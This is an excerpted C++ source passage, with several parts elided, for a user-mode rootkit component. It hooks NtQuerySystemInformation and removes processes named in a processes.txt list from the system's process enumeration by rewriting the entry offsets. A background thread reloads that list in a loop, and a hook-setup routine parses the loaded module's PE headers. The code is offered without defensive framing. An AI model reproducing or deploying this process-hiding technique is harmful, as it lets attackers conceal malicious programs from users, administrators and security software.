...
(PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
	...
	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
	{
		...
		do
		{
			...
			for (int i = 0; i < processes.size(); i++)
				ifTrue = ifTrue || !wcsncmp(pNext->ImageName.Buffer, processes[i].c_str(), pNext->ImageName.Length);
			
			if (ifTrue)
			{
				if (!pNext->NextEntryOffset) pCurrent->NextEntryOffset = 0; else pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				pNext = pCurrent;
			}
...
DWORD StartHook(LPVOID lModule)
{
	...
	LPBYTE pAddress = (LPBYTE)moduleInfo.lpBaseOfDll;
	...
	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE)
		MessageBox(NULL, L"Failed", L"NtQuerySystemInformation Hook", MB_OK);

	CloseHandle(hModule);
	return 0;
}

DWORD UpdateThread(LPVOID lModule)
{
	while (true)
	{
		processes.clear();

		std::string str; std::ifstream file;
		...
		if (!file)
		{
			...
			FILE* newFile = fopen("processes.txt", "w");
			fclose(newFile);
